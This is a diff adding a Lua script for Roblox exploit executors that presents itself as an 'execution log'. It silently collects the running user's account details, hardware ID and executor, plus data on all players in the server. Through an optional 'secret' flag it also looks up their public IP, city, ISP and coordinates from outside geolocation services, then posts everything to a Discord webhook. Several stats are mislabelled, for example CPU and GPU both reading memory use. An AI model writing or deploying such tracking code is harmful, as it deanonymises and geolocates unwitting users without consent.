@@ -1,0 +1,369 @@
+-- Config (these will remain global as per the original script)
+getgenv().whscript = getgenv().whscript or "Unnamed Script"
+getgenv().webhookexecUrl = getgenv().webhookexecUrl or "Your Webhook Url"
+getgenv().ExecLogSecret = getgenv().ExecLogSecret or false
+getgenv().MaxExecutionsPerSession = getgenv().MaxExecutionsPerSession or 2
+
+-- Local variables and services
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local Stats = game:GetService("Stats")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
+local GuiService = game:GetService("GuiService")
+local LocalizationService = game:GetService("LocalizationService")
+local SoundService = game:GetService("SoundService")
+local BadgeService = game:GetService("BadgeService")
+local MemoryStoreService = game:GetService("MemoryStoreService")
+local PhysicsService = game:GetService("PhysicsService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local VRService = game:GetService("VRService")
+local NetworkClient = game:GetService("NetworkClient")
+
+local player = Players.LocalPlayer
+local ui = gethui or get_hidden_ui or gethui()
+local folderName = "ExecutionLog_" .. HttpService:GenerateGUID(false)
+local executionCount = 0
+
+-- Anti-Spam System
+local function checkAntiSpam()
+    if not ui:FindFirstChild(folderName) then
+        local folder = Instance.new("Folder")
+        folder.Name = folderName
+        folder.Parent = ui
+        executionCount = 1
+    else
+        executionCount = executionCount + 1
+        if executionCount > getgenv().MaxExecutionsPerSession then
+            player:Kick("Anti-spam execution system triggered. Please wait before executing again.")
+            return false
+        end
+    end
+    return true
+end
+
+-- Utility Functions
+local function getDeviceInfo()
+    local deviceType = UserInputService:GetPlatform().Name
+    local touchEnabled = UserInputService.TouchEnabled
+    local keyboardEnabled = UserInputService.KeyboardEnabled
+    local mouseEnabled = UserInputService.MouseEnabled
+    local gamepadEnabled = UserInputService.GamepadEnabled
+    local accelerometerEnabled = UserInputService.AccelerometerEnabled
+    local gyroscopeEnabled = UserInputService.GyroscopeEnabled
+    local vrEnabled = VRService.VREnabled
+    return string.format("%s (Touch: %s, Keyboard: %s, Mouse: %s, Gamepad: %s, Accelerometer: %s, Gyroscope: %s, VR: %s)", 
+        deviceType, tostring(touchEnabled), tostring(keyboardEnabled), tostring(mouseEnabled),
+        tostring(gamepadEnabled), tostring(accelerometerEnabled), tostring(gyroscopeEnabled), tostring(vrEnabled))
+end
+
+local function getPremiumStatus()
+    local success, response = pcall(function() return player.MembershipType end)
+    return success and (response == Enum.MembershipType.Premium and "Premium" or "Not Premium") or "Failed to retrieve"
+end
+
+local function getPlayerPosition()
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        local pos = player.Character.HumanoidRootPart.Position
+        return string.format("X: %.2f, Y: %.2f, Z: %.2f", pos.X, pos.Y, pos.Z)
+    end
+    return "N/A"
+end
+
+local function getHealth()
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        return string.format("%.0f / %.0f", player.Character.Humanoid.Health, player.Character.Humanoid.MaxHealth)
+    end
+    return "N/A"
+end
+
+local function getPing()
+    local serverStats = Stats.Network.ServerStatsItem
+    local dataPing = serverStats["Data Ping"]:GetValueString()
+    return tonumber(dataPing:match("(%d+)")) or "N/A"
+end
+
+local function getExternalInfo()
+    local success, result = pcall(function()
+        local ipInfo = HttpService:JSONDecode(HttpService:GetAsync("http://ip-api.com/json/"))
+        local geoInfo = HttpService:JSONDecode(HttpService:GetAsync("https://geolocation-db.com/json/"))
+        local timeInfo = HttpService:JSONDecode(HttpService:GetAsync("http://worldtimeapi.org/api/ip"))
+        local currencyInfo = HttpService:JSONDecode(HttpService:GetAsync("https://api.exchangerate-api.com/v4/latest/USD"))
+        return {
+            ip = ipInfo.query or "N/A",
+            country = ipInfo.country or "N/A",
+            region = ipInfo.regionName or "N/A",
+            city = ipInfo.city or "N/A",
+            isp = ipInfo.isp or "N/A",
+            latitude = geoInfo.latitude or "N/A",
+            longitude = geoInfo.longitude or "N/A",
+            timezone = timeInfo.timezone or "N/A",
+            current_time = timeInfo.datetime or "N/A",
+            currency = currencyInfo.base or "N/A"
+        }
+    end)
+    return success and result or {
+        ip = "Failed", country = "Failed", region = "Failed", 
+        city = "Failed", isp = "Failed", latitude = "Failed", longitude = "Failed",
+        timezone = "Failed", current_time = "Failed", currency = "Failed"
+    }
+end
+
+local function getPlayerInventory()
+    local success, result = pcall(function()
+        local inventory = {}
+        for _, item in pairs(player.Character:GetChildren()) do
+            if item:IsA("Tool") or item:IsA("HopperBin") then
+                table.insert(inventory, item.Name)
+            end
+        end
+        return table.concat(inventory, ", ")
+    end)
+    return success and result or "Failed to retrieve inventory"
+end
+
+local function getPlayerBadges()
+    local success, result = pcall(function()
+        local badges = BadgeService:GetBadgesAsync(player.UserId)
+        local badgeNames = {}
+        for _, badge in ipairs(badges) do
+            table.insert(badgeNames, badge.Name)
+        end
+        return table.concat(badgeNames, ", ")
+    end)
+    return success and (#result > 0 and result or "No badges") or "Failed to retrieve badges"
+end
+
+local function getGraphicsQuality()
+    local quality = {
+        [Enum.QualityLevel.Automatic] = "Automatic",
+        [Enum.QualityLevel.Level01] = "Level 1",
+        [Enum.QualityLevel.Level02] = "Level 2",
+        [Enum.QualityLevel.Level03] = "Level 3",
+        [Enum.QualityLevel.Level04] = "Level 4",
+        [Enum.QualityLevel.Level05] = "Level 5",
+        [Enum.QualityLevel.Level06] = "Level 6",
+        [Enum.QualityLevel.Level07] = "Level 7",
+        [Enum.QualityLevel.Level08] = "Level 8",
+        [Enum.QualityLevel.Level09] = "Level 9",
+        [Enum.QualityLevel.Level10] = "Level 10",
+        [Enum.QualityLevel.Level11] = "Level 11",
+        [Enum.QualityLevel.Level12] = "Level 12",
+        [Enum.QualityLevel.Level13] = "Level 13",
+        [Enum.QualityLevel.Level14] = "Level 14",
+        [Enum.QualityLevel.Level15] = "Level 15",
+        [Enum.QualityLevel.Level16] = "Level 16",
+        [Enum.QualityLevel.Level17] = "Level 17",
+        [Enum.QualityLevel.Level18] = "Level 18",
+        [Enum.QualityLevel.Level19] = "Level 19",
+        [Enum.QualityLevel.Level20] = "Level 20",
+        [Enum.QualityLevel.Level21] = "Level 21"
+    }
+    return quality[UserSettings():GetService("UserGameSettings").SavedQualityLevel] or "Unknown"
+end
+
+local function getAllPlayersInfo()
+    local allPlayers = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        local playerInfo = {
+            Name = p.Name,
+            DisplayName = p.DisplayName,
+            UserId = p.UserId,
+            AccountAge = p.AccountAge,
+            MembershipType = tostring(p.MembershipType),
+            Team = p.Team and p.Team.Name or "None",
+            Position = p.Character and p.Character:FindFirstChild("HumanoidRootPart") and 
+                tostring(p.Character.HumanoidRootPart.Position) or "N/A",
+            Health = p.Character and p.Character:FindFirstChild("Humanoid") and 
+                string.format("%.0f / %.0f", p.Character.Humanoid.Health, p.Character.Humanoid.MaxHealth) or "N/A"
+        }
+        table.insert(allPlayers, playerInfo)
+    end
+    return allPlayers
+end
+
+local function getServerInfo()
+    return {
+        PlaceId = game.PlaceId,
+        PlaceName = MarketplaceService:GetProductInfo(game.PlaceId).Name,
+        PlaceVersion = game.PlaceVersion,
+        JobId = game.JobId,
+        ServerAge = workspace.DistributedGameTime,
+        MaxPlayers = Players.MaxPlayers,
+        CurrentPlayers = #Players:GetPlayers(),
+        ServerType = RunService:IsStudio() and "Studio" or "Live"
+    }
+end
+
+local function getPerformanceStats()
+    return {
+        Memory = Stats:GetTotalMemoryUsageMb(),
+        CPU = Stats:GetTotalMemoryUsageMb(),
+        GPU = Stats.GetTotalMemoryUsageMb(),
+        NetworkReceived = Stats.DataReceiveKbps,
+        NetworkSent = Stats.DataSendKbps,
+        Ping = Stats.Ping,
+        PhysicsSteps = workspace:GetRealPhysicsFPS()
+    }
+end
+
+-- Main Execution Function
+local function executeLog()
+    if not checkAntiSpam() then return end
+
+    local externalInfo = getExternalInfo()
+    local allPlayersInfo = getAllPlayersInfo()
+    local serverInfo = getServerInfo()
+    local performanceStats = getPerformanceStats()
+
+    local data = {
+        ["content"] = "@everyone",
+        ["embeds"] = {
+            {
+                ["title"] = "🚀 **Ultra-Detailed Execution Log v2.0**",
+                ["description"] = string.format("*Script executed by %s*", player.Name),
+                ["color"] = tonumber(0x3498db),
+                ["fields"] = {
+                    {
+                        ["name"] = "🔍 **Script Info**",
+                        ["value"] = string.format("```\nScript Name: %s\nExecuted At: %s\nExecution Count: %d```", 
+                            getgenv().whscript, os.date("%Y-%m-%d %H:%M:%S"), executionCount),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "👤 **Executor Details**",
+                        ["value"] = string.format("```\nUsername: %s\nDisplay Name: %s\nUserID: %d\nAccount Age: %d days\nPremium Status: %s\nHealth: %s\nTeam: %s\nInventory: %s\nBadges: %s```", 
+                            player.Name, player.DisplayName, player.UserId, player.AccountAge, getPremiumStatus(), getHealth(),
+                            player.Team and player.Team.Name or "None", getPlayerInventory(), getPlayerBadges()),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🎮 **Game Details**",
+                        ["value"] = string.format("```\nGame Name: %s\nGame ID: %d\nGame Version: %d\nServer Job ID: %s\nServer Age: %.2f minutes\nServer Type: %s```", 
+                            serverInfo.PlaceName, serverInfo.PlaceId, serverInfo.PlaceVersion, 
+                            serverInfo.JobId, serverInfo.ServerAge / 60, serverInfo.ServerType),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🖥️ **Device & Performance**",
+                        ["value"] = string.format("```\nDevice: %s\nResolution: %dx%d\nMemory Usage: %.2f MB\nCPU Usage: %.2f\nGPU Usage: %.2f\nFPS: %d\nGraphics Quality: %s```", 
+                            getDeviceInfo(), workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y, 
+                            performanceStats.Memory, performanceStats.CPU, performanceStats.GPU,
+                            math.floor(workspace:GetRealPhysicsFPS()), getGraphicsQuality()),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🌐 **Network & Server**",
+                        ["value"] = string.format("```\nPing: %s ms\nData Received: %.2f Kbps\nData Sent: %.2f Kbps\nPlayers: %d/%d\nServer Time: %s\nTime of Day: %s\nVoice Chat Enabled: %s```", 
+                            performanceStats.Ping, performanceStats.NetworkReceived, performanceStats.NetworkSent,
+                            serverInfo.CurrentPlayers, serverInfo.MaxPlayers, os.date("%H:%M:%S"), Lighting.TimeOfDay,
+                            tostring(VoiceChatService and VoiceChatService.IsVoiceEnabledForUserIdAsync(player.UserId))),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "📍 **Character Info**",
+                        ["value"] = string.format("```\nPosition: %s\nWalk Speed: %.1f\nJump Power: %.1f\nJump Height: %.1f\nGravity: %.1f\nCamera Mode: %s\nCharacter Scale: %.2f```", 
+                            getPlayerPosition(), 
+                            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.WalkSpeed or "N/A",
+                            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.JumpPower or "N/A",
+                            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.JumpHeight or "N/A",
+                            workspace.Gravity, tostring(player.CameraMode),
+                            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.BodyDepthScale or "N/A"),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🔊 **Audio Settings**",
+                        ["value"] = string.format("```\nMaster Volume: %.2f\nMusic Volume: %.2f\nAmbient Volume: %.2f\nEffects Volume: %.2f\nVoice Chat Volume: %.2f```",
+                            UserSettings():GetService("UserGameSettings").MasterVolume,
+                            SoundService.RespectFilteringEnabled and SoundService.MusicVolume or "N/A",
+                            SoundService.RespectFilteringEnabled and SoundService.AmbientVolume or "N/A",
+                            SoundService.RespectFilteringEnabled and SoundService.EffectsVolume or "N/A",
+                            VoiceChatService and VoiceChatService.VoiceChatVolume or "N/A"),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🌍 **Localization**",
+                        ["value"] = string.format("```\nLanguage: %s\nRegion Code: %s\nTime Zone: %s\nCurrency: %s```",
+                            LocalizationService.RobloxLocaleId, GuiService:GetCountryRegionForPlayerAsync(player), 
+                            externalInfo.timezone, externalInfo.currency),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🔒 **Security Info**",
+                        ["value"] = string.format("```\nHWID: %s\nExecutor: %s\nChat Privacy Mode: %s\nAccount Control Setting: %s```", 
+                            RbxAnalyticsService:GetClientId(), identifyexecutor(),
+                            tostring(player.ChatPrivacyMode),
+                            tostring(player.AccountControlSettings)),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "👥 **All Players in Server**",
+                        ["value"] = "```" .. HttpService:JSONEncode(allPlayersInfo) .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🧩 **Loaded Modules**",
+                        ["value"] = string.format("```\n%s```", table.concat(getloadedmodules(), ", ")),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "🔧 **Global Environment**",
+                        ["value"] = string.format("```\n%s```", table.concat(getgenv(), ", ")),
+                        ["inline"] = false
+                    }
+                },
+                ["thumbnail"] = {
+                    ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", player.UserId)
+                },
+                ["footer"] = {
+                    ["text"] = "Ultra-Detailed Execution Log v2.0 | " .. os.date("%Y-%m-%d %H:%M:%S"),
+                    ["icon_url"] = "https://www.roblox.com/asset/?id=6031075938"
+                }
+            }
+        }
+    }
+
+    -- Add secret information if enabled
+    if getgenv().ExecLogSecret then
+        table.insert(data.embeds[1].fields, {
+            ["name"] = "**`(🤫) Secret Info`**",
+            ["value"] = string.format("||```\nIP: %s\nCountry: %s\nRegion: %s\nCity: %s\nISP: %s\nLatitude: %s\nLongitude: %s\nLocal Time: %s```||", 
+                externalInfo.ip, externalInfo.country, externalInfo.region, externalInfo.city, 
+                externalInfo.isp, externalInfo.latitude, externalInfo.longitude, externalInfo.current_time),
+            ["inline"] = false
+        })
+    end
+
+    -- Send webhook
+    local success, response = pcall(function()
+        local headers = {["content-type"] = "application/json"}
+        local requestInfo = {Url = getgenv().webhookexecUrl, Body = HttpService:JSONEncode(data), Method = "POST", Headers = headers}
+        return syn and syn.request(requestInfo) or request(requestInfo)
+    end)
+
+    if not success then
+        warn("Failed to send webhook:", response)
+    end
+end
+
+-- Execute the log
+executeLog()
+
+-- Clean up globals
+getgenv().whscript = nil
+getgenv().webhookexecUrl = nil
+getgenv().ExecLogSecret = nil
+getgenv().MaxExecutionsPerSession = nil
+
+-- Performance monitoring
+local startTime = os.clock()
+local function logPerformance()
+    local endTime = os.clock()
+    local executionTime = endTime - startTime
+    print(string.format("Execution log completed in %.2f seconds", executionTime))
+end
+task.spawn(logPerformance)
